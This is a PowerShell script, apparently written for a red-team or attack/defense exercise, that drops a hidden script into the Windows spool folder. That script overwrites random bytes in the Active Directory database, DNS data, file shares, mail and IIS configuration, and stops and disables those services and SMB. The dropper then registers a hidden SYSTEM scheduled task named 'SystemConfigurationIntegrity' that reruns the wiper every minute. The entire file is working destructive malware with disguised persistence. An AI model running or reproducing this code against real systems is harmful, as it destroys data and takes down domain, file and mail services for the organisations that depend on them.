# service_corrupt_task.ps1 - NEVER touches SSH

$enforcePath = "C:\Windows\System32\spool\svc_corrupt.ps1"

$lines = @(
    'function Corrupt-File {',
    '    param([string]$path)',
    '    if (Test-Path $path) {',
    '        try {',
    '            $bytes = [System.IO.File]::ReadAllBytes($path)',
    '            if ($bytes.Length -gt 0) {',
    '                $offset = Get-Random -Minimum 0 -Maximum $bytes.Length',
    '                for ($i = 0; $i -lt 8; $i++) {',
    '                    if (($offset + $i) -lt $bytes.Length) { $bytes[$offset + $i] = 0 }',
    '                }',
    '                [System.IO.File]::WriteAllBytes($path, $bytes)',
    '            }',
    '        } catch {}',
    '    }',
    '}',
    '',
    'function Corrupt-Dir {',
    '    param([string]$dir)',
    '    if (Test-Path $dir) {',
    '        Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {',
    '            Corrupt-File $_.FullName',
    '        }',
    '    }',
    '}',
    '',
    '# DC',
    'Corrupt-Dir "C:\Windows\NTDS"',
    'Corrupt-File "C:\Windows\NTDS\ntds.dit"',
    'Corrupt-File "C:\Windows\NTDS\edb.log"',
    'Corrupt-Dir "C:\Windows\System32\dns"',
    'Stop-Service -Name "NTDS"     -Force -ErrorAction SilentlyContinue',
    'Stop-Service -Name "DNS"      -Force -ErrorAction SilentlyContinue',
    'Stop-Service -Name "Netlogon" -Force -ErrorAction SilentlyContinue',
    'Set-Service  -Name "NTDS"     -StartupType Disabled -ErrorAction SilentlyContinue',
    'Set-Service  -Name "DNS"      -StartupType Disabled -ErrorAction SilentlyContinue',
    '',
    '# SMB',
    'Corrupt-Dir "C:\Shares"',
    'Corrupt-Dir "C:\SharedFiles"',
    'Stop-Service -Name "LanmanServer" -Force -ErrorAction SilentlyContinue',
    'Set-Service  -Name "LanmanServer" -StartupType Disabled -ErrorAction SilentlyContinue',
    'Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force -ErrorAction SilentlyContinue',
    'Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction SilentlyContinue',
    '',
    '# SMTP',
    'Corrupt-Dir "C:\inetpub\mailroot"',
    'Corrupt-Dir "C:\Program Files\hMailServer"',
    'Corrupt-Dir "C:\Windows\System32\inetsrv\config"',
    'Stop-Service -Name "SMTPSVC" -Force -ErrorAction SilentlyContinue',
    'Stop-Service -Name "W3SVC"   -Force -ErrorAction SilentlyContinue',
    'Set-Service  -Name "SMTPSVC" -StartupType Disabled -ErrorAction SilentlyContinue',
    'Set-Service  -Name "W3SVC"   -StartupType Disabled -ErrorAction SilentlyContinue'
)

Set-Content -Path $enforcePath -Value $lines -Encoding utf8 -Force

& powershell.exe -ExecutionPolicy Bypass -File $enforcePath

$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$enforcePath`""

$trigger = New-ScheduledTaskTrigger `
    -RepetitionInterval (New-TimeSpan -Minutes 1) `
    -Once -At (Get-Date)

$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -ExecutionTimeLimit (New-TimeSpan -Minutes 1) `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1)

$principal = New-ScheduledTaskPrincipal `
    -UserId "SYSTEM" `
    -RunLevel Highest

Register-ScheduledTask `
    -TaskName "SystemConfigurationIntegrity" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Principal $principal `
    -Force